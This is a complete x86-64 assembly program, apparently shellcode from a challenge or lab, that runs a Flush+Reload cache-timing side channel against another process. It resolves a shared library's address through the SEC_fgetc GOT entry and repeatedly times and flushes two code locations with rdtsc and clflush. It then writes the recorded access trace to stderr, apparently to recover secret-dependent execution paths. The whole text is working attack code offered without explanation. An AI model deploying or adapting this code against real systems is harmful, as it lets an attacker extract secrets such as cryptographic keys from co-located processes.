; ----------- rebase_stack ----------- 
add rsp, -0x700000

; ----------- save_data_on_stack ----------- 
mov rsi, 0xbccff5cff5cdf5cc
xor rsi, 0xFFFFFFFFFFFFFFFF
mov [rsp+0x200], rsi
mov rsi, 0x4130454641393438
mov [rsp+0x208], rsi
mov rsi, 0x3046324231314337
mov [rsp+0x210], rsi
mov rsi, 0x4637453233433338
mov [rsp+0x218], rsi
mov rsi, 0x3043413846304244
mov [rsp+0x220], rsi
mov rsi, 0x4434384438393133
mov [rsp+0x228], rsi
mov rsi, 0x4436324230393939
mov [rsp+0x230], rsi
mov rsi, 0x3144314233343436
mov [rsp+0x238], rsi
mov rsi, 0x3332413633413538
mov [rsp+0x240], rsi
mov rsi, 0x3942423136354135
mov [rsp+0x248], rsi
mov rsi, 0x3538373938454639
mov [rsp+0x250], rsi
mov rsi, 0x4231313331373338
mov [rsp+0x258], rsi
mov rsi, 0x3745464436444132
mov [rsp+0x260], rsi
mov rsi, 0x3736363939314535
mov [rsp+0x268], rsi
mov rsi, 0x3741454445373336
mov [rsp+0x270], rsi
mov rsi, 0x3531413431433942
mov [rsp+0x278], rsi
mov rsi, 0x4546463646354138
mov [rsp+0x280], rsi
mov rsi, 0x4434314331413531
mov [rsp+0x288], rsi
mov rsi, 0x4344463830384441
mov [rsp+0x290], rsi
mov rsi, 0x3033353634384639
mov [rsp+0x298], rsi
mov rsi, 0x4533454634444445
mov [rsp+0x2a0], rsi
mov rsi, 0x3538394634463638
mov [rsp+0x2a8], rsi
mov rsi, 0x3146353444433137
mov [rsp+0x2b0], rsi
mov rsi, 0x3335444530393131
mov [rsp+0x2b8], rsi
mov rsi, 0x3644303439434631
mov [rsp+0x2c0], rsi
mov rsi, 0x3530453243324332
mov [rsp+0x2c8], rsi
mov rsi, 0x3332323737393946
mov [rsp+0x2d0], rsi
mov rsi, 0x3737393038303835
mov [rsp+0x2d8], rsi
mov rsi, 0x3431463735313336
mov [rsp+0x2e0], rsi
mov rsi, 0x4437354134454630
mov [rsp+0x2e8], rsi
mov rsi, 0x4432303944413642
mov [rsp+0x2f0], rsi
mov rsi, 0x4232314632363939
mov [rsp+0x2f8], rsi
mov rsi, 0x4337343531434644
mov [rsp+0x300], rsi
mov rsi, 0x3632383245334445
mov [rsp+0x308], rsi
mov rsi, 0x4132423535323430
mov [rsp+0x310], rsi
mov rsi, 0x4333373331333335
mov [rsp+0x318], rsi
mov rsi, 0x4343373535454541
mov [rsp+0x320], rsi
mov rsi, 0x3041364444353238
mov [rsp+0x328], rsi
mov rsi, 0x4237443244334333
mov [rsp+0x330], rsi
mov rsi, 0x3144413445363031
mov [rsp+0x338], rsi
mov rsi, 0x3542434237343335
mov [rsp+0x340], rsi
mov rsi, 0x3036434442373630
mov [rsp+0x348], rsi
mov rsi, 0x4343314646363733
mov [rsp+0x350], rsi
mov rsi, 0x3431433246333331
mov [rsp+0x358], rsi
mov rsi, 0xfff5
xor rsi, 0xFFFFFFFFFFFFFFFF
mov [rsp+0x360], rsi

; ----------- prepare_measurement -----------
xor r12,r12
xor r8,r8
xor r9,r9
xor r10,r10
xor rcx,rcx
mov r12, [0x000000601c98]    ; SEC_fgetc@got.plt
sub r12, 0x35f0
mov r8, 0x600
; ----------- write_from_stack -----------
mov rax, 1
mov rdi, 0x4
mov rsi, rsp
add rsi, 0x200
mov rdx, 0x161
syscall

; ----------- do_measurement -----------
mesure:
	mfence
	lfence
	rdtsc
	lfence
	mov r11, rax
	mov rsi,[r12+0x3064]
	lfence
	rdtsc
	clflush [r12+0x3064]
	sub rax, r11

	mov r11, rax
	sub r11, 200
	test r11,r11
	jns mesure2

save_data:
	mov r9, 2
	mov [rsp+r8], r9
	add r8,1
	inc rcx
	jmp next

mesure2:
	mfence
	lfence
	rdtsc
	lfence
	mov r11, rax
	mov rsi,[r12+0x32E4]
	lfence
	rdtsc
	clflush [r12+0x32E4]
	sub rax, r11

	mov r11, rax
	sub r11, 200
	test r11,r11
	jns save_null_data

save_data2:
	mov r9, 1
	mov [rsp+r8], r9
	add r8,1
	inc rcx
	jmp next

save_null_data:
	mov r9, 0
	mov [rsp+r8], r9
	add r8,1
	inc rcx
	jmp next

next:
	mov rbx, 0x2000
	loop:
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		dec rbx
		jnz loop

	add r10,1
	cmp r10,0x61A8
	jnz mesure


mov r9, rcx
cmp r9, 0
jz exit

; delimiter
mov rsi, 0xd2f5d20000F5D2F5
xor rsi, 0xFFFFFFFFFFFFFFFF
mov [rsp+0x10], rsi

xor r10, r10
mov r8, 0x600
print:
	; print value
	mov rax, 1                       ; syscall write
	mov rdi, 0x2      ; fd
	mov rdx, r9                      ; len
	mov rsi, rsp                     ; addr to print
	add rsi, r8                      ; addr to print
	syscall
exit:
; ----------- save_data_on_stack ----------- 
mov rsi, 0xfff5b4b0b4b0f5
xor rsi, 0xFFFFFFFFFFFFFFFF
mov [rsp+0x400], rsi

; ----------- write_from_stack -----------
mov rax, 1
mov rdi, 0x2
mov rsi, rsp
add rsi, 0x400
mov rdx, 0x6
syscall

; ----------- exit -----------
mov rax, 60
mov rdi, 0
syscall
